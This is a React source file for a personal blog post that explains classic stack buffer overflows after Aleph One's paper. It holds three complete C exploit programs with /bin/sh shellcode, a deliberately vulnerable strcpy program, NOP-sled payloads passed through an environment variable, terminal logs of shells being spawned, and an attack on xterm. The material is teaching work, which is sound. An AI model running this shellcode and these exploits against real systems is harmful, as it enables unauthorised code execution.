import React, { useState }  from "react";
import "../markdown.css";
import CodeBlock from "../../codeblock/codeblock";

const reference = `// My exploitation practices: 
https://github.com/kkli08/Computer_Security_LAB_1/blob/main/sploits/explanations_lab1.txt

// My own blog transfer from github: 
https://github.com/kkli08/Buffer-Overflow/wiki

// Smashing The Stack For Fun And Profit - Aleph One
https://insecure.org/stf/smashstack.html

// Buffer Overflows for Dummies - Josef Neliflen
https://github.com/kkli08/Buffer-Overflow/blob/main/481.pdf

* [Buffer Overflow 101](https://www.youtube.com/watch?v=_D8eLCmlrS8)
* [University of Nottingham - Running a Buffer Overflow Attack](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=793s)
* [My blog](https://www.damianli.com/blog)
* [off-by-one buffer overflow explanation](https://nixhacker.com/exploiting-off-by-one-buffer-overflow/)
* [Exploitation Example](https://www.exploit-db.com/docs/english/28478-linux-off-by-one-vulnerabilities.pdf)
* [OWASP Buffer Overflow via Environment Variables](https://owasp.org/www-community/attacks/Buffer_Overflow_via_Environment_Variables)
* [The Null Byte Problem](http://www.linuxfocus.org/English/March2001/article183.shtml)


`;
const exploit_3 = `// vulnerable.c
void main(int argc, char *argv[]) {
    char buffer[512];
    if (argc > 1) strcpy(buffer,argv[1]);
}

================================================================

#include <stdlib.h>
#define DEFAULT_OFFSET 0 
#define DEFAULT_BUFFER_SIZE 512 
#define NOP 0x90

char shellcode[] = 
"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b" 
"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd" 
"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

unsigned long get_sp(void) {
    __asm__("movl %esp,%eax"); 
}

void main(int argc, char *argv[]) {
    char *buff, *ptr;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; 
    int i;

    if (argc > 1) bsize = atoi(argv[1]); 
    if (argc > 2) offset = atoi(argv[2]);

    if (!(buff = malloc(bsize))) { 
        printf("Can't allocate memory.\n");
        exit(0); 
    }

    addr = get_sp() - offset; 
    printf("Using address: 0x%x\n", addr);

    ptr = buff;
    addr_ptr = (long *) ptr;
    for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

    for (i = 0; i < bsize/2; i++) 
        buff[i] = NOP;

    ptr = buff + ((bsize/2) - (strlen(shellcode)/2)); 
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i]; 

    buff[bsize - 1] = '\0';

    memcpy(buff,"EGG=",4); 
    putenv(buff); 
    system("/bin/bash");
}`;

const exploit_2 = `// vulnerable.c
void main(int argc, char *argv[]) {
    char buffer[512];
    if (argc > 1) strcpy(buffer,argv[1]);
}

================================================================

// exploit2.c

// We can create a program that takes as a parameter a buffer size, 
// and an offset from its own stack pointer (where we believe the buffer we want to overflow may live). 
// We'll put the overflow string in an environment variable so it is easy to manipulate
#include <stdlib.h>
#define DEFAULT_OFFSET 0 
#define DEFAULT_BUFFER_SIZE 512

char shellcode[] = 
"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b" 
"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd" 
"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

unsigned long get_sp(void) {
    __asm__("movl %esp,%eax"); 
}

void main(int argc, char *argv[]) {
    char *buff, *ptr;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE; 
    int i;
    if (argc > 1) bsize = atoi(argv[1]); 
    if (argc > 2) offset = atoi(argv[2]);
    if (!(buff = malloc(bsize))) { 
        printf("Can't allocate memory.\n");
        exit(0); 
    }
    addr = get_sp() - offset; 
    printf("Using address: 0x%x\n", addr);
    ptr = buff;
    addr_ptr = (long *) ptr;

    for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

    // This is done to move the pointer past the last address written into the buffer. (I assume)
    ptr += 4;

    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i]; 

    buff[bsize - 1] = '\0';

    memcpy(buff,"EGG=",4); 
    putenv(buff); 
    system("/bin/bash");
}

// Now we can try to guess what the buffer and offset should be
==========================================================
[aleph1]$ ./exploit2 500 
Using address: 0xbffffdb4 
[aleph1]$ ./vulnerable $EGG 
[aleph1]$ exit
[aleph1]$ ./exploit2 600 
Using address: 0xbffffdb4 
[aleph1]$ ./vulnerable $EGG 
Illegal instruction 
[aleph1]$ exit
[aleph1]$ ./exploit2 600 100 
Using address: 0xbffffd4c 
[aleph1]$ ./vulnerable $EGG 
Segmentation fault
[aleph1]$ exit
[aleph1]$ ./exploit2 600 200 
Using address: 0xbffffce8 
[aleph1]$ ./vulnerable $EGG 
Segmentation fault
[aleph1]$ exit
.
.
.
[aleph1]$ ./exploit2 600 1564 
Using address: 0xbffff794 
[aleph1]$ ./vulnerable $EGG
$

==========================================================`;

const exploit_1 = `// overflow1.c

char shellcode[] = 
    "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b" 
    "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd" 
    "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

char large_string[128];

void main() {
    char buffer[96];
    int i;
    long *long_ptr = (long *) large_string;
    for (i = 0; i < 32; i++) 
        *(long_ptr + i) = (int) buffer;

    for (i = 0; i < strlen(shellcode); i++) 
        large_string[i] = shellcode[i];

    strcpy(buffer,large_string); 
    }

==========================================================
[aleph1]$ gcc -o overflow1 overflow1.c 
[aleph1]$ ./overflow1
$ exit // successfully spawn a shell
exit
[aleph1]$
==========================================================`;

const shellcode = `char shellcode[] = 
    "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b" 
    "\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd" 
    "\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";`;

const loops = `// first loop
for (i = 0; i < 32; i++) *(long_ptr + i) = (int) buffer;

// second loop
for (i = 0; i < strlen(shellcode); i++) large_string[i] = shellcode[i];`;

function Blogdetail() {

    return(
        <div id="blogdetail">
            <div className="blogdetailtitle">
                <h1>
                Buffer Overflow
                </h1>
                <p>Jan 24, 2024. 15 mins read</p>
            </div>
            <div className="blogdetailcontent">
            <div className="App">
            <h1>Exploit I</h1>
            <CodeBlock code={exploit_1} />
            <br />
            <h2>General Guide</h2><br/>
            <h2>Shellcode</h2><br/>
            <CodeBlock code={shellcode} />
            <p>This is the shellcode, a string of bytes that represents machine code to be executed once the exploit is successful. This specific shellcode is designed to execute a shell (/bin/sh).</p>
            <h2>Loops</h2><br/>
            <CodeBlock code={loops} />
            <p>The first loop fills the large_string with the address of buffer. Each long is typically 4 bytes on 32-bit systems (8 bytes on 64-bit), so this loop effectively writes the buffer's address multiple times into large_string.</p>
            <p>The second loop copies the shellcode into the beginning of large_string. The rest of large_string still contains the address of buffer.</p>
            <h2>Executing the Overflow</h2><br/>
            <CodeBlock code={`    strcpy(buffer, large_string);`} />
            <p>The strcpy function is used to copy large_string into buffer. Since large_string is larger than buffer (128 bytes vs. 96 bytes), this overflows buffer, writing beyond its bounds. The overflow is designed to overwrite the return address on the stack with the address of buffer. Since buffer's address is filled in large_string and large_string now starts with the shellcode, the execution will jump to the shellcode once the function returns.</p>
            <h2>Summary of Exploit</h2>
            <p>1. Overwriting the return address of the main function with the address of buffer (which is filled in large_string).</p>
            <p>2. Placing the shellcode at the beginning of large_string, so when the return address is used, it points to the shellcode.</p>
            <p>3. The shellcode is executed, which typically opens a shell.</p><br></br>

            <h1>Exploit II</h1>
            <CodeBlock code={exploit_2} /><br></br>
            <h2>Breakdown</h2>
            <p>1. Shellcode Declaration:<br></br>The shellcode array contains the bytes of the shellcode, which is meant to execute /bin/sh when run.</p>
            <p>2. Stack Pointer Address Function get_sp:<br></br>The get_sp() is an assembly function that retrieves the current value of the stack pointer (ESP register on x86 architecture). This address is used to estimate where in memory the exploit should write the return address.</p>
            <p>3. Main Function:<br></br>The program takes optional command-line arguments to adjust the buffer size and the offset from the stack pointer.</p>
            <p>4. Buffer Allocation and Address Calculation: <br></br> A buffer of size bsize is allocated. The address to overwrite the return address is calculated as the current stack pointer minus the offset.</p>
            <p>5. Filling the Buffer:<br></br> The buffer is filled with the calculated address. This is the address where the shellcode will be placed. After the addresses, the shellcode is copied into the buffer.</p>
            <p>6. Environment Variable and System Call:<br></br>The buffer is then set as an environment variable (EGG). A new bash shell is spawned using system("/bin/bash").</p>

            <h2>Key Concept</h2><br></br>
            <CodeBlock code={`Buffer Overflow: 
    The exploit relies on overflowing the buffer in the vulnerable.c program to 
    overwrite the return address on the stack.

Return Address Overwrite: 
    The goal is to overwrite the return address with the address of the shellcode so that 
    when the vulnerable function returns, it jumps to the shellcode instead.

Trial and Error: 
    Finding the right buffer size and offset often requires trial and error, 
    as demonstrated in the command line interactions. The exact values can depend on various factors 
    like system architecture, memory layout, and compiler behavior.
`} /><br></br>
            <h1>Exploit III (NOP)</h1>
            <p>As we can see II Exploit is not an efficient process. Trying to guess the offset even while knowing where the beginning of the stack lives is nearly impossible. We would need at best a hundred tries, and at worst a couple of thousand. The problem is we need to guess exactly where the address of our code will start. If we are off by one byte more or less we will just get a segmentation violation or a invalid instruction.</p><br></br>
            <p>One way to increase our chances is to pad the front of our overflow buffer with NOP instructions. Almost all processors have a NOP instruction that performs a null operation. It is usually used to delay execution for purposes of timing. We will take advantage of it and fill half of our overflow buffer with them. We will place our shellcode at the center, and then follow it with the return addresses.</p>
            <br/>
            <CodeBlock code={exploit_3} />
            <p>A good selection for our buffer size is about 100 bytes more than the size of the buffer we are trying to overflow. This will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the NOPs, but still overwriting the return address with the address we guessed. The buffer we are trying to overflow is 512 bytes long, so we'll use 612. Let's try to overflow our test program with our new exploit:</p>
            <CodeBlock code={`==========================================================
[aleph1]$ ./exploit3 612 
Using address: 0xbffffdb4    
[aleph1]$ ./vulnerable $EGG 
$

==========================================================`} />
            <p>This change has improved our chances a hundredfold. Let's try it now on a real case of a buffer overflow. We'll use for our demonstration the buffer overflow on the Xt library. For our example, we'll use xterm (all programs linked with the Xt library are vulnerable). You must be running an X server and allow connections to it from the localhost. Set your DISPLAY variable accordingly.</p>
            <CodeBlock code={`==========================================================
[aleph1]$ export DISPLAY=:0.0
[aleph1]$ ./exploit3 1124
Using address: 0xbffffdb4
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG 
^C
[aleph1]$ exit
[aleph1]$ ./exploit3 2148 100
Using address: 0xbffffd48
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
....
Warning: some arguments in previous message were lost 
Illegal instruction
[aleph1]$ exit
.
.
.
[aleph1]$ ./exploit4 2148 600
Using address: 0xbffffb54
[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
Warning: some arguments in previous message were lost 
bash$

==========================================================`} />
            <h1>Reference</h1>
            <CodeBlock code={reference} />
            <p>Created on Jan 24, 2024 on github, moved to my website on Jun 9, 2024.</p>







            </div>
                
                
            </div>
        </div>
    );
}

export default Blogdetail;